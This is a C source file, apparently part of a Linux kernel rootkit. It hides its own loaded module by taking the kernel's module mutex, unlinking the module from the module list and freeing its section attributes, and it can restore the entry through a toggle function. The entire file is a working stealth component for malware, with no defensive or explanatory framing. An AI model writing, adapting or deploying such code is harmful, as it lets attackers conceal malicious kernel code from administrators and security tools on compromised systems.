#include <linux/module.h>
#include <linux/mutex.h>
#include <linux/slab.h>

#include "module.h"
#include "util.h"

int hide_m = 0;
static struct list_head *mod_list;
struct mutex *module_mutex_p;

static
void hide(void)
{
	if (!module_mutex_p) {
		module_mutex_p = (struct mutex *)ksym_lookup_name("module_mutex");
	}
	while (!mutex_trylock(module_mutex_p))
		cpu_relax();
	mod_list = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
	mutex_unlock(module_mutex_p);
	
	hide_m = 1;
}

static
void show(void)
{
	if (!module_mutex_p) {
		module_mutex_p = (struct mutex *)ksym_lookup_name("module_mutex");
	}
	while (!mutex_trylock(module_mutex_p))
		cpu_relax();
	list_add(&THIS_MODULE->list, mod_list);
	mutex_unlock(module_mutex_p);
	
	hide_m = 0;
}

void hide_module(void)
{
    if (hide_m == 0)
        hide();
    else if (hide_m == 1)
        show();
}
